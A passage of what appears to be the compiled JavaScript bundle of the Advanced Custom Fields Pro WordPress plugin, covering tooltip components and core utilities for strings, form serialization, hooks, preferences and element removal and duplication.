    setup: function (props) {
      $.extend(this.data, props);
      this.$el = $(this.tmpl());
    },
    initialize: function () {
      // render
      this.render();

      // append
      this.show();

      // position
      this.position();

      // timeout
      var timeout = this.get('timeout');
      if (timeout) {
        setTimeout($.proxy(this.fade, this), timeout);
      }
    },
    update: function (props) {
      $.extend(this.data, props);
      this.initialize();
    },
    render: function () {
      this.html(this.get('text'));
    },
    show: function () {
      $('body').append(this.$el);
    },
    hide: function () {
      this.$el.remove();
    },
    fade: function () {
      // add class
      this.$el.addClass('acf-fade-up');

      // remove
      this.setTimeout(function () {
        this.remove();
      }, 250);
    },
    html: function (html) {
      this.$el.html(html);
    },
    position: function () {
      // vars
      var $tooltip = this.$el;
      var $target = this.get('target');
      if (!$target) return;

      // Reset position.
      $tooltip.removeClass('right left bottom top').css({
        top: 0,
        left: 0
      });

      // Declare tollerance to edge of screen.
      var tolerance = 10;

      // Find target position.
      var targetWidth = $target.outerWidth();
      var targetHeight = $target.outerHeight();
      var targetTop = $target.offset().top;
      var targetLeft = $target.offset().left;

      // Find tooltip position.
      var tooltipWidth = $tooltip.outerWidth();
      var tooltipHeight = $tooltip.outerHeight();
      var tooltipTop = $tooltip.offset().top; // Should be 0, but WP media grid causes this to be 32 (toolbar padding).

      // Assume default top alignment.
      var top = targetTop - tooltipHeight - tooltipTop;
      var left = targetLeft + targetWidth / 2 - tooltipWidth / 2;

      // Check if too far left.
      if (left < tolerance) {
        $tooltip.addClass('right');
        left = targetLeft + targetWidth;
        top = targetTop + targetHeight / 2 - tooltipHeight / 2 - tooltipTop;

        // Check if too far right.
      } else if (left + tooltipWidth + tolerance > $(window).width()) {
        $tooltip.addClass('left');
        left = targetLeft - tooltipWidth;
        top = targetTop + targetHeight / 2 - tooltipHeight / 2 - tooltipTop;

        // Check if too far up.
      } else if (top - $(window).scrollTop() < tolerance) {
        $tooltip.addClass('bottom');
        top = targetTop + targetHeight - tooltipTop;

        // No colision with edges.
      } else {
        $tooltip.addClass('top');
      }

      // update css
      $tooltip.css({
        top: top,
        left: left
      });
    }
  });
  var TooltipConfirm = Tooltip.extend({
    data: {
      text: '',
      textConfirm: '',
      textCancel: '',
      target: null,
      targetConfirm: true,
      confirm: function () {},
      cancel: function () {},
      context: false
    },
    events: {
      'click [data-event="cancel"]': 'onCancel',
      'click [data-event="confirm"]': 'onConfirm'
    },
    addEvents: function () {
      // add events
      acf.Model.prototype.addEvents.apply(this);

      // vars
      var $document = $(document);
      var $target = this.get('target');

      // add global 'cancel' click event
      // - use timeout to avoid the current 'click' event triggering the onCancel function
      this.setTimeout(function () {
        this.on($document, 'click', 'onCancel');
      });

      // add target 'confirm' click event
      // - allow setting to control this feature
      if (this.get('targetConfirm')) {
        this.on($target, 'click', 'onConfirm');
      }
    },
    removeEvents: function () {
      // remove events
      acf.Model.prototype.removeEvents.apply(this);

      // vars
      var $document = $(document);
      var $target = this.get('target');

      // remove custom events
      this.off($document, 'click');
      this.off($target, 'click');
    },
    render: function () {
      // defaults
      var text = this.get('text') || acf.__('Are you sure?');
      var textConfirm = this.get('textConfirm') || acf.__('Yes');
      var textCancel = this.get('textCancel') || acf.__('No');

      // html
      var html = [text, '<a href="#" data-event="confirm">' + textConfirm + '</a>', '<a href="#" data-event="cancel">' + textCancel + '</a>'].join(' ');

      // html
      this.html(html);

      // class
      this.$el.addClass('-confirm');
    },
    onCancel: function (e, $el) {
      // prevent default
      e.preventDefault();
      e.stopImmediatePropagation();

      // callback
      var callback = this.get('cancel');
      var context = this.get('context') || this;
      callback.apply(context, arguments);

      //remove
      this.remove();
    },
    onConfirm: function (e, $el) {
      // Prevent event from propagating completely to allow "targetConfirm" to be clicked.
      e.preventDefault();
      e.stopImmediatePropagation();

      // callback
      var callback = this.get('confirm');
      var context = this.get('context') || this;
      callback.apply(context, arguments);

      //remove
      this.remove();
    }
  });

  // storage
  acf.models.Tooltip = Tooltip;
  acf.models.TooltipConfirm = TooltipConfirm;

  /**
   *  tooltipManager
   *
   *  description
   *
   *  @date	17/4/18
   *  @since	5.6.9
   *
   *  @param	type $var Description. Default.
   *  @return	type Description.
   */

  var tooltipHoverHelper = new acf.Model({
    tooltip: false,
    events: {
      'mouseenter .acf-js-tooltip': 'showTitle',
      'mouseup .acf-js-tooltip': 'hideTitle',
      'mouseleave .acf-js-tooltip': 'hideTitle',
      'focus .acf-js-tooltip': 'showTitle',
      'blur .acf-js-tooltip': 'hideTitle',
      'keyup .acf-js-tooltip': 'onKeyUp'
    },
    showTitle: function (e, $el) {
      // vars
      var title = $el.attr('title');

      // bail early if no title
      if (!title) {
        return;
      }

      // clear title to avoid default browser tooltip
      $el.attr('title', '');

      // create
      if (!this.tooltip) {
        this.tooltip = acf.newTooltip({
          text: title,
          target: $el
        });

        // update
      } else {
        this.tooltip.update({
          text: title,
          target: $el
        });
      }
    },
    hideTitle: function (e, $el) {
      // hide tooltip
      this.tooltip.hide();

      // restore title
      $el.attr('title', this.tooltip.get('text'));
    },
    onKeyUp: function (e, $el) {
      if ('Escape' === e.key) {
        this.hideTitle(e, $el);
      }
    }
  });
})(jQuery);

/***/ }),

/***/ "./src/advanced-custom-fields-pro/assets/src/js/_acf.js":
/*!**************************************************************!*\
  !*** ./src/advanced-custom-fields-pro/assets/src/js/_acf.js ***!
  \**************************************************************/
/***/ (function() {

(function ($, undefined) {
  /**
   *  acf
   *
   *  description
   *
   *  @date	14/12/17
   *  @since	5.6.5
   *
   *  @param	type $var Description. Default.
   *  @return	type Description.
   */

  // The global acf object
  var acf = {};

  // Set as a browser global
  window.acf = acf;

  /** @var object Data sent from PHP */
  acf.data = {};

  /**
   *  get
   *
   *  Gets a specific data value
   *
   *  @date	14/12/17
   *  @since	5.6.5
   *
   *  @param	string name
   *  @return	mixed
   */

  acf.get = function (name) {
    return this.data[name] || null;
  };

  /**
   *  has
   *
   *  Returns `true` if the data exists and is not null
   *
   *  @date	14/12/17
   *  @since	5.6.5
   *
   *  @param	string name
   *  @return	boolean
   */

  acf.has = function (name) {
    return this.get(name) !== null;
  };

  /**
   *  set
   *
   *  Sets a specific data value
   *
   *  @date	14/12/17
   *  @since	5.6.5
   *
   *  @param	string name
   *  @param	mixed value
   *  @return	this
   */

  acf.set = function (name, value) {
    this.data[name] = value;
    return this;
  };

  /**
   *  uniqueId
   *
   *  Returns a unique ID
   *
   *  @date	9/11/17
   *  @since	5.6.3
   *
   *  @param	string prefix Optional prefix.
   *  @return	string
   */

  var idCounter = 0;
  acf.uniqueId = function (prefix) {
    var id = ++idCounter + '';
    return prefix ? prefix + id : id;
  };

  /**
   *  acf.uniqueArray
   *
   *  Returns a new array with only unique values
   *  Credit: https://stackoverflow.com/questions/1960473/get-all-unique-values-in-an-array-remove-duplicates
   *
   *  @date	23/3/18
   *  @since	5.6.9
   *
   *  @param	type $var Description. Default.
   *  @return	type Description.
   */

  acf.uniqueArray = function (array) {
    function onlyUnique(value, index, self) {
      return self.indexOf(value) === index;
    }
    return array.filter(onlyUnique);
  };

  /**
   *  uniqid
   *
   *  Returns a unique ID (PHP version)
   *
   *  @date	9/11/17
   *  @since	5.6.3
   *  @source	http://locutus.io/php/misc/uniqid/
   *
   *  @param	string prefix Optional prefix.
   *  @return	string
   */

  var uniqidSeed = '';
  acf.uniqid = function (prefix, moreEntropy) {
    //  discuss at: http://locutus.io/php/uniqid/
    // original by: Kevin van Zonneveld (http://kvz.io)
    //  revised by: Kankrelune (http://www.webfaktory.info/)
    //      note 1: Uses an internal counter (in locutus global) to avoid collision
    //   example 1: var $id = uniqid()
    //   example 1: var $result = $id.length === 13
    //   returns 1: true
    //   example 2: var $id = uniqid('foo')
    //   example 2: var $result = $id.length === (13 + 'foo'.length)
    //   returns 2: true
    //   example 3: var $id = uniqid('bar', true)
    //   example 3: var $result = $id.length === (23 + 'bar'.length)
    //   returns 3: true
    if (typeof prefix === 'undefined') {
      prefix = '';
    }
    var retId;
    var formatSeed = function (seed, reqWidth) {
      seed = parseInt(seed, 10).toString(16); // to hex str
      if (reqWidth < seed.length) {
        // so long we split
        return seed.slice(seed.length - reqWidth);
      }
      if (reqWidth > seed.length) {
        // so short we pad
        return Array(1 + (reqWidth - seed.length)).join('0') + seed;
      }
      return seed;
    };
    if (!uniqidSeed) {
      // init seed with big random int
      uniqidSeed = Math.floor(Math.random() * 0x75bcd15);
    }
    uniqidSeed++;
    retId = prefix; // start with prefix, add current milliseconds hex string
    retId += formatSeed(parseInt(new Date().getTime() / 1000, 10), 8);
    retId += formatSeed(uniqidSeed, 5); // add seed hex string
    if (moreEntropy) {
      // for more entropy we add a float lower to 10
      retId += (Math.random() * 10).toFixed(8).toString();
    }
    return retId;
  };

  /**
   *  strReplace
   *
   *  Performs a string replace
   *
   *  @date	14/12/17
   *  @since	5.6.5
   *
   *  @param	string search
   *  @param	string replace
   *  @param	string subject
   *  @return	string
   */

  acf.strReplace = function (search, replace, subject) {
    return subject.split(search).join(replace);
  };

  /**
   *  strCamelCase
   *
   *  Converts a string into camelCase
   *  Thanks to https://stackoverflow.com/questions/2970525/converting-any-string-into-camel-case
   *
   *  @date	14/12/17
   *  @since	5.6.5
   *
   *  @param	string str
   *  @return	string
   */

  acf.strCamelCase = function (str) {
    var matches = str.match(/([a-zA-Z0-9]+)/g);
    return matches ? matches.map(function (s, i) {
      var c = s.charAt(0);
      return (i === 0 ? c.toLowerCase() : c.toUpperCase()) + s.slice(1);
    }).join('') : '';
  };

  /**
   *  strPascalCase
   *
   *  Converts a string into PascalCase
   *  Thanks to https://stackoverflow.com/questions/1026069/how-do-i-make-the-first-letter-of-a-string-uppercase-in-javascript
   *
   *  @date	14/12/17
   *  @since	5.6.5
   *
   *  @param	string str
   *  @return	string
   */

  acf.strPascalCase = function (str) {
    var camel = acf.strCamelCase(str);
    return camel.charAt(0).toUpperCase() + camel.slice(1);
  };

  /**
   *  acf.strSlugify
   *
   *  Converts a string into a HTML class friendly slug
   *
   *  @date	21/3/18
   *  @since	5.6.9
   *
   *  @param	string str
   *  @return	string
   */

  acf.strSlugify = function (str) {
    return acf.strReplace('_', '-', str.toLowerCase());
  };
  acf.strSanitize = function (str) {
    // chars (https://jsperf.com/replace-foreign-characters)
    var map = {
      À: 'A',
      Á: 'A',
      Â: 'A',
      Ã: 'A',
      Ä: 'A',
      Å: 'A',
      Æ: 'AE',
      Ç: 'C',
      È: 'E',
      É: 'E',
      Ê: 'E',
      Ë: 'E',
      Ì: 'I',
      Í: 'I',
      Î: 'I',
      Ï: 'I',
      Ð: 'D',
      Ñ: 'N',
      Ò: 'O',
      Ó: 'O',
      Ô: 'O',
      Õ: 'O',
      Ö: 'O',
      Ø: 'O',
      Ù: 'U',
      Ú: 'U',
      Û: 'U',
      Ü: 'U',
      Ý: 'Y',
      ß: 's',
      à: 'a',
      á: 'a',
      â: 'a',
      ã: 'a',
      ä: 'a',
      å: 'a',
      æ: 'ae',
      ç: 'c',
      è: 'e',
      é: 'e',
      ê: 'e',
      ë: 'e',
      ì: 'i',
      í: 'i',
      î: 'i',
      ï: 'i',
      ñ: 'n',
      ò: 'o',
      ó: 'o',
      ô: 'o',
      õ: 'o',
      ö: 'o',
      ø: 'o',
      ù: 'u',
      ú: 'u',
      û: 'u',
      ü: 'u',
      ý: 'y',
      ÿ: 'y',
      Ā: 'A',
      ā: 'a',
      Ă: 'A',
      ă: 'a',
      Ą: 'A',
      ą: 'a',
      Ć: 'C',
      ć: 'c',
      Ĉ: 'C',
      ĉ: 'c',
      Ċ: 'C',
      ċ: 'c',
      Č: 'C',
      č: 'c',
      Ď: 'D',
      ď: 'd',
      Đ: 'D',
      đ: 'd',
      Ē: 'E',
      ē: 'e',
      Ĕ: 'E',
      ĕ: 'e',
      Ė: 'E',
      ė: 'e',
      Ę: 'E',
      ę: 'e',
      Ě: 'E',
      ě: 'e',
      Ĝ: 'G',
      ĝ: 'g',
      Ğ: 'G',
      ğ: 'g',
      Ġ: 'G',
      ġ: 'g',
      Ģ: 'G',
      ģ: 'g',
      Ĥ: 'H',
      ĥ: 'h',
      Ħ: 'H',
      ħ: 'h',
      Ĩ: 'I',
      ĩ: 'i',
      Ī: 'I',
      ī: 'i',
      Ĭ: 'I',
      ĭ: 'i',
      Į: 'I',
      į: 'i',
      İ: 'I',
      ı: 'i',
      Ĳ: 'IJ',
      ĳ: 'ij',
      Ĵ: 'J',
      ĵ: 'j',
      Ķ: 'K',
      ķ: 'k',
      Ĺ: 'L',
      ĺ: 'l',
      Ļ: 'L',
      ļ: 'l',
      Ľ: 'L',
      ľ: 'l',
      Ŀ: 'L',
      ŀ: 'l',
      Ł: 'l',
      ł: 'l',
      Ń: 'N',
      ń: 'n',
      Ņ: 'N',
      ņ: 'n',
      Ň: 'N',
      ň: 'n',
      ŉ: 'n',
      Ō: 'O',
      ō: 'o',
      Ŏ: 'O',
      ŏ: 'o',
      Ő: 'O',
      ő: 'o',
      Œ: 'OE',
      œ: 'oe',
      Ŕ: 'R',
      ŕ: 'r',
      Ŗ: 'R',
      ŗ: 'r',
      Ř: 'R',
      ř: 'r',
      Ś: 'S',
      ś: 's',
      Ŝ: 'S',
      ŝ: 's',
      Ş: 'S',
      ş: 's',
      Š: 'S',
      š: 's',
      Ţ: 'T',
      ţ: 't',
      Ť: 'T',
      ť: 't',
      Ŧ: 'T',
      ŧ: 't',
      Ũ: 'U',
      ũ: 'u',
      Ū: 'U',
      ū: 'u',
      Ŭ: 'U',
      ŭ: 'u',
      Ů: 'U',
      ů: 'u',
      Ű: 'U',
      ű: 'u',
      Ų: 'U',
      ų: 'u',
      Ŵ: 'W',
      ŵ: 'w',
      Ŷ: 'Y',
      ŷ: 'y',
      Ÿ: 'Y',
      Ź: 'Z',
      ź: 'z',
      Ż: 'Z',
      ż: 'z',
      Ž: 'Z',
      ž: 'z',
      ſ: 's',
      ƒ: 'f',
      Ơ: 'O',
      ơ: 'o',
      Ư: 'U',
      ư: 'u',
      Ǎ: 'A',
      ǎ: 'a',
      Ǐ: 'I',
      ǐ: 'i',
      Ǒ: 'O',
      ǒ: 'o',
      Ǔ: 'U',
      ǔ: 'u',
      Ǖ: 'U',
      ǖ: 'u',
      Ǘ: 'U',
      ǘ: 'u',
      Ǚ: 'U',
      ǚ: 'u',
      Ǜ: 'U',
      ǜ: 'u',
      Ǻ: 'A',
      ǻ: 'a',
      Ǽ: 'AE',
      ǽ: 'ae',
      Ǿ: 'O',
      ǿ: 'o',
      // extra
      ' ': '_',
      "'": '',
      '?': '',
      '/': '',
      '\\': '',
      '.': '',
      ',': '',
      '`': '',
      '>': '',
      '<': '',
      '"': '',
      '[': '',
      ']': '',
      '|': '',
      '{': '',
      '}': '',
      '(': '',
      ')': ''
    };

    // vars
    var nonWord = /\W/g;
    var mapping = function (c) {
      return map[c] !== undefined ? map[c] : c;
    };

    // replace
    str = str.replace(nonWord, mapping);

    // lowercase
    str = str.toLowerCase();

    // return
    return str;
  };

  /**
   *  acf.strMatch
   *
   *  Returns the number of characters that match between two strings
   *
   *  @date	1/2/18
   *  @since	5.6.5
   *
   *  @param	type $var Description. Default.
   *  @return	type Description.
   */

  acf.strMatch = function (s1, s2) {
    // vars
    var val = 0;
    var min = Math.min(s1.length, s2.length);

    // loop
    for (var i = 0; i < min; i++) {
      if (s1[i] !== s2[i]) {
        break;
      }
      val++;
    }

    // return
    return val;
  };

  /**
   * Escapes HTML entities from a string.
   *
   * @date	08/06/2020
   * @since	5.9.0
   *
   * @param	string string The input string.
   * @return	string
   */
  acf.strEscape = function (string) {
    var htmlEscapes = {
      '&': '&amp;',
      '<': '&lt;',
      '>': '&gt;',
      '"': '&quot;',
      "'": '&#39;'
    };
    return ('' + string).replace(/[&<>"']/g, function (chr) {
      return htmlEscapes[chr];
    });
  };

  // Tests.
  //console.log( acf.strEscape('Test 1') );
  //console.log( acf.strEscape('Test & 1') );
  //console.log( acf.strEscape('Test\'s &amp; 1') );
  //console.log( acf.strEscape('<script>js</script>') );

  /**
   * Unescapes HTML entities from a string.
   *
   * @date	08/06/2020
   * @since	5.9.0
   *
   * @param	string string The input string.
   * @return	string
   */
  acf.strUnescape = function (string) {
    var htmlUnescapes = {
      '&amp;': '&',
      '&lt;': '<',
      '&gt;': '>',
      '&quot;': '"',
      '&#39;': "'"
    };
    return ('' + string).replace(/&amp;|&lt;|&gt;|&quot;|&#39;/g, function (entity) {
      return htmlUnescapes[entity];
    });
  };

  // Tests.
  //console.log( acf.strUnescape( acf.strEscape('Test 1') ) );
  //console.log( acf.strUnescape( acf.strEscape('Test & 1') ) );
  //console.log( acf.strUnescape( acf.strEscape('Test\'s &amp; 1') ) );
  //console.log( acf.strUnescape( acf.strEscape('<script>js</script>') ) );

  /**
   * Escapes HTML entities from a string.
   *
   * @date	08/06/2020
   * @since	5.9.0
   *
   * @param	string string The input string.
   * @return	string
   */
  acf.escAttr = acf.strEscape;

  /**
   * Encodes <script> tags for safe HTML output.
   *
   * @date	08/06/2020
   * @since	5.9.0
   *
   * @param	string string The input string.
   * @return	string
   */
  acf.escHtml = function (string) {
    return ('' + string).replace(/<script|<\/script/g, function (html) {
      return acf.strEscape(html);
    });
  };

  // Tests.
  //console.log( acf.escHtml('<script>js</script>') );
  //console.log( acf.escHtml( acf.strEscape('<script>js</script>') ) );
  //console.log( acf.escHtml( '<script>js1</script><script>js2</script>' ) );

  /**
   *  acf.decode
   *
   *  description
   *
   *  @date	13/1/18
   *  @since	5.6.5
   *
   *  @param	type $var Description. Default.
   *  @return	type Description.
   */

  acf.decode = function (string) {
    return $('<textarea/>').html(string).text();
  };

  /**
   *  parseArgs
   *
   *  Merges together defaults and args much like the WP wp_parse_args function
   *
   *  @date	14/12/17
   *  @since	5.6.5
   *
   *  @param	object args
   *  @param	object defaults
   *  @return	object
   */

  acf.parseArgs = function (args, defaults) {
    if (typeof args !== 'object') args = {};
    if (typeof defaults !== 'object') defaults = {};
    return $.extend({}, defaults, args);
  };

  /**
   *  __
   *
   *  Retrieve the translation of $text.
   *
   *  @date	16/4/18
   *  @since	5.6.9
   *
   *  @param	string text Text to translate.
   *  @return	string Translated text.
   */

  if (window.acfL10n == undefined) {
    acfL10n = {};
  }
  acf.__ = function (text) {
    return acfL10n[text] || text;
  };

  /**
   *  _x
   *
   *  Retrieve translated string with gettext context.
   *
   *  @date	16/4/18
   *  @since	5.6.9
   *
   *  @param	string text Text to translate.
   *  @param	string context Context information for the translators.
   *  @return	string Translated text.
   */

  acf._x = function (text, context) {
    return acfL10n[text + '.' + context] || acfL10n[text] || text;
  };

  /**
   *  _n
   *
   *  Retrieve the plural or single form based on the amount.
   *
   *  @date	16/4/18
   *  @since	5.6.9
   *
   *  @param	string single Single text to translate.
   *  @param	string plural Plural text to translate.
   *  @param	int number The number to compare against.
   *  @return	string Translated text.
   */

  acf._n = function (single, plural, number) {
    if (number == 1) {
      return acf.__(single);
    } else {
      return acf.__(plural);
    }
  };
  acf.isArray = function (a) {
    return Array.isArray(a);
  };
  acf.isObject = function (a) {
    return typeof a === 'object';
  };

  /**
   *  serialize
   *
   *  description
   *
   *  @date	24/12/17
   *  @since	5.6.5
   *
   *  @param	type $var Description. Default.
   *  @return	type Description.
   */

  var buildObject = function (obj, name, value) {
    // replace [] with placeholder
    name = name.replace('[]', '[%%index%%]');

    // vars
    var keys = name.match(/([^\[\]])+/g);
    if (!keys) return;
    var length = keys.length;
    var ref = obj;

    // loop
    for (var i = 0; i < length; i++) {
      // vars
      var key = String(keys[i]);

      // value
      if (i == length - 1) {
        // %%index%%
        if (key === '%%index%%') {
          ref.push(value);

          // default
        } else {
          ref[key] = value;
        }

        // path
      } else {
        // array
        if (keys[i + 1] === '%%index%%') {
          if (!acf.isArray(ref[key])) {
            ref[key] = [];
          }

          // object
        } else {
          if (!acf.isObject(ref[key])) {
            ref[key] = {};
          }
        }

        // crawl
        ref = ref[key];
      }
    }
  };
  acf.serialize = function ($el, prefix) {
    // vars
    var obj = {};
    var inputs = acf.serializeArray($el);

    // prefix
    if (prefix !== undefined) {
      // filter and modify
      inputs = inputs.filter(function (item) {
        return item.name.indexOf(prefix) === 0;
      }).map(function (item) {
        item.name = item.name.slice(prefix.length);
        return item;
      });
    }

    // loop
    for (var i = 0; i < inputs.length; i++) {
      buildObject(obj, inputs[i].name, inputs[i].value);
    }

    // return
    return obj;
  };

  /**
   *  acf.serializeArray
   *
   *  Similar to $.serializeArray() but works with a parent wrapping element.
   *
   *  @date	19/8/18
   *  @since	5.7.3
   *
   *  @param	jQuery $el The element or form to serialize.
   *  @return	array
   */

  acf.serializeArray = function ($el) {
    return $el.find('select, textarea, input').serializeArray();
  };

  /**
   *  acf.serializeForAjax
   *
   *  Returns an object containing name => value data ready to be encoded for Ajax.
   *
   *  @date	17/12/18
   *  @since	5.8.0
   *
   *  @param	jQUery $el The element or form to serialize.
   *  @return	object
   */
  acf.serializeForAjax = function ($el) {
    // vars
    var data = {};
    var index = {};

    // Serialize inputs.
    var inputs = acf.serializeArray($el);

    // Loop over inputs and build data.
    inputs.map(function (item) {
      // Append to array.
      if (item.name.slice(-2) === '[]') {
        data[item.name] = data[item.name] || [];
        data[item.name].push(item.value);
        // Append
      } else {
        data[item.name] = item.value;
      }
    });

    // return
    return data;
  };

  /**
   *  addAction
   *
   *  Wrapper for acf.hooks.addAction
   *
   *  @date	14/12/17
   *  @since	5.6.5
   *
   *  @param	n/a
   *  @return	this
   */

  /*
  var prefixAction = function( action ){
  	return 'acf_' + action;
  }
  */

  acf.addAction = function (action, callback, priority, context) {
    //action = prefixAction(action);
    acf.hooks.addAction.apply(this, arguments);
    return this;
  };

  /**
   *  removeAction
   *
   *  Wrapper for acf.hooks.removeAction
   *
   *  @date	14/12/17
   *  @since	5.6.5
   *
   *  @param	n/a
   *  @return	this
   */

  acf.removeAction = function (action, callback) {
    //action = prefixAction(action);
    acf.hooks.removeAction.apply(this, arguments);
    return this;
  };

  /**
   *  doAction
   *
   *  Wrapper for acf.hooks.doAction
   *
   *  @date	14/12/17
   *  @since	5.6.5
   *
   *  @param	n/a
   *  @return	this
   */

  var actionHistory = {};
  //var currentAction = false;
  acf.doAction = function (action) {
    //action = prefixAction(action);
    //currentAction = action;
    actionHistory[action] = 1;
    acf.hooks.doAction.apply(this, arguments);
    actionHistory[action] = 0;
    return this;
  };

  /**
   *  doingAction
   *
   *  Return true if doing action
   *
   *  @date	14/12/17
   *  @since	5.6.5
   *
   *  @param	n/a
   *  @return	this
   */

  acf.doingAction = function (action) {
    //action = prefixAction(action);
    return actionHistory[action] === 1;
  };

  /**
   *  didAction
   *
   *  Wrapper for acf.hooks.doAction
   *
   *  @date	14/12/17
   *  @since	5.6.5
   *
   *  @param	n/a
   *  @return	this
   */

  acf.didAction = function (action) {
    //action = prefixAction(action);
    return actionHistory[action] !== undefined;
  };

  /**
   *  currentAction
   *
   *  Wrapper for acf.hooks.doAction
   *
   *  @date	14/12/17
   *  @since	5.6.5
   *
   *  @param	n/a
   *  @return	this
   */

  acf.currentAction = function () {
    for (var k in actionHistory) {
      if (actionHistory[k]) {
        return k;
      }
    }
    return false;
  };

  /**
   *  addFilter
   *
   *  Wrapper for acf.hooks.addFilter
   *
   *  @date	14/12/17
   *  @since	5.6.5
   *
   *  @param	n/a
   *  @return	this
   */

  acf.addFilter = function (action) {
    //action = prefixAction(action);
    acf.hooks.addFilter.apply(this, arguments);
    return this;
  };

  /**
   *  removeFilter
   *
   *  Wrapper for acf.hooks.removeFilter
   *
   *  @date	14/12/17
   *  @since	5.6.5
   *
   *  @param	n/a
   *  @return	this
   */

  acf.removeFilter = function (action) {
    //action = prefixAction(action);
    acf.hooks.removeFilter.apply(this, arguments);
    return this;
  };

  /**
   *  applyFilters
   *
   *  Wrapper for acf.hooks.applyFilters
   *
   *  @date	14/12/17
   *  @since	5.6.5
   *
   *  @param	n/a
   *  @return	this
   */

  acf.applyFilters = function (action) {
    //action = prefixAction(action);
    return acf.hooks.applyFilters.apply(this, arguments);
  };

  /**
   *  getArgs
   *
   *  description
   *
   *  @date	15/12/17
   *  @since	5.6.5
   *
   *  @param	type $var Description. Default.
   *  @return	type Description.
   */

  acf.arrayArgs = function (args) {
    return Array.prototype.slice.call(args);
  };

  /**
   *  extendArgs
   *
   *  description
   *
   *  @date	15/12/17
   *  @since	5.6.5
   *
   *  @param	type $var Description. Default.
   *  @return	type Description.
   */

  /*
  acf.extendArgs = function( ){
  	var args = Array.prototype.slice.call( arguments );
  	var realArgs = args.shift();
  		
  	Array.prototype.push.call(arguments, 'bar')
  	return Array.prototype.push.apply( args, arguments );
  };
  */

  // Preferences
  // - use try/catch to avoid JS error if cookies are disabled on front-end form
  try {
    var preferences = JSON.parse(localStorage.getItem('acf')) || {};
  } catch (e) {
    var preferences = {};
  }

  /**
   *  getPreferenceName
   *
   *  Gets the true preference name.
   *  Converts "this.thing" to "thing-123" if editing post 123.
   *
   *  @date	11/11/17
   *  @since	5.6.5
   *
   *  @param	string name
   *  @return	string
   */

  var getPreferenceName = function (name) {
    if (name.substr(0, 5) === 'this.') {
      name = name.substr(5) + '-' + acf.get('post_id');
    }
    return name;
  };

  /**
   *  acf.getPreference
   *
   *  Gets a preference setting or null if not set.
   *
   *  @date	11/11/17
   *  @since	5.6.5
   *
   *  @param	string name
   *  @return	mixed
   */

  acf.getPreference = function (name) {
    name = getPreferenceName(name);
    return preferences[name] || null;
  };

  /**
   *  acf.setPreference
   *
   *  Sets a preference setting.
   *
   *  @date	11/11/17
   *  @since	5.6.5
   *
   *  @param	string name
   *  @param	mixed value
   *  @return	n/a
   */

  acf.setPreference = function (name, value) {
    name = getPreferenceName(name);
    if (value === null) {
      delete preferences[name];
    } else {
      preferences[name] = value;
    }
    localStorage.setItem('acf', JSON.stringify(preferences));
  };

  /**
   *  acf.removePreference
   *
   *  Removes a preference setting.
   *
   *  @date	11/11/17
   *  @since	5.6.5
   *
   *  @param	string name
   *  @return	n/a
   */

  acf.removePreference = function (name) {
    acf.setPreference(name, null);
  };

  /**
   *  remove
   *
   *  Removes an element with fade effect
   *
   *  @date	1/1/18
   *  @since	5.6.5
   *
   *  @param	type $var Description. Default.
   *  @return	type Description.
   */

  acf.remove = function (props) {
    // allow jQuery
    if (props instanceof jQuery) {
      props = {
        target: props
      };
    }

    // defaults
    props = acf.parseArgs(props, {
      target: false,
      endHeight: 0,
      complete: function () {}
    });

    // action
    acf.doAction('remove', props.target);

    // tr
    if (props.target.is('tr')) {
      removeTr(props);

      // div
    } else {
      removeDiv(props);
    }
  };

  /**
   *  removeDiv
   *
   *  description
   *
   *  @date	16/2/18
   *  @since	5.6.9
   *
   *  @param	type $var Description. Default.
   *  @return	type Description.
   */

  var removeDiv = function (props) {
    // vars
    var $el = props.target;
    var height = $el.height();
    var width = $el.width();
    var margin = $el.css('margin');
    var outerHeight = $el.outerHeight(true);
    var style = $el.attr('style') + ''; // needed to copy

    // wrap
    $el.wrap('<div class="acf-temp-remove" style="height:' + outerHeight + 'px"></div>');
    var $wrap = $el.parent();

    // set pos
    $el.css({
      height: height,
      width: width,
      margin: margin,
      position: 'absolute'
    });

    // fade wrap
    setTimeout(function () {
      $wrap.css({
        opacity: 0,
        height: props.endHeight
      });
    }, 50);

    // remove
    setTimeout(function () {
      $el.attr('style', style);
      $wrap.remove();
      props.complete();
    }, 301);
  };

  /**
   *  removeTr
   *
   *  description
   *
   *  @date	16/2/18
   *  @since	5.6.9
   *
   *  @param	type $var Description. Default.
   *  @return	type Description.
   */

  var removeTr = function (props) {
    // vars
    var $tr = props.target;
    var height = $tr.height();
    var children = $tr.children().length;

    // create dummy td
    var $td = $('<td class="acf-temp-remove" style="padding:0; height:' + height + 'px" colspan="' + children + '"></td>');

    // fade away tr
    $tr.addClass('acf-remove-element');

    // update HTML after fade animation
    setTimeout(function () {
      $tr.html($td);
    }, 251);

    // allow .acf-temp-remove to exist before changing CSS
    setTimeout(function () {
      // remove class
      $tr.removeClass('acf-remove-element');

      // collapse
      $td.css({
        height: props.endHeight
      });
    }, 300);

    // remove
    setTimeout(function () {
      $tr.remove();
      props.complete();
    }, 451);
  };

  /**
   *  duplicate
   *
   *  description
   *
   *  @date	3/1/18
   *  @since	5.6.5
   *
   *  @param	type $var Description. Default.
   *  @return	type Description.
   */

  acf.duplicate = function (args) {
    // allow jQuery
    if (args instanceof jQuery) {
      args = {
        target: args
      };
    }

    // defaults
    args = acf.parseArgs(args, {
      target: false,
      search: '',
      replace: '',
      rename: true,
      before: function ($el) {},
      after: function ($el, $el2) {},
      append: function ($el, $el2) {
        $el.after($el2);
      }
    });

    // compatibility
    args.target = args.target || args.$el;

    // vars
    var $el = args.target;

    // search
    args.search = args.search || $el.attr('data-id');
    args.replace = args.replace || acf.uniqid();

    // before
    // - allow acf to modify DOM
    // - fixes bug where select field option is not selected
    args.before($el);
    acf.doAction('before_duplicate', $el);

    // clone
    var $el2 = $el.clone();

    // rename
    if (args.rename) {
      acf.rename({
        target: $el2,
        search: args.search,
        replace: args.replace,
        replacer: typeof args.rename === 'function' ? args.rename : null
      });
    }

    // remove classes
    $el2.removeClass('acf-clone');
    $el2.find('.ui-sortable').removeClass('ui-sortable');

    // remove any initialised select2s prevent the duplicated object stealing the previous select2.
    $el2.find('[data-select2-id]').removeAttr('data-select2-id');
    $el2.find('.select2').remove();

    // subfield select2 renames happen after init and contain a duplicated ID. force change those IDs to prevent this.
    $el2.find('.acf-is-subfields select[data-ui="1"]').each(function () {
      $(this).prop('id', $(this).prop('id').replace('acf_fields', acf.uniqid('duplicated_') + '_acf_fields'));
    });

    // remove tab wrapper to ensure proper init
    $el2.find('.acf-field-settings > .acf-tab-wrap').remove();

    // after
    // - allow acf to modify DOM
    args.after($el, $el2);
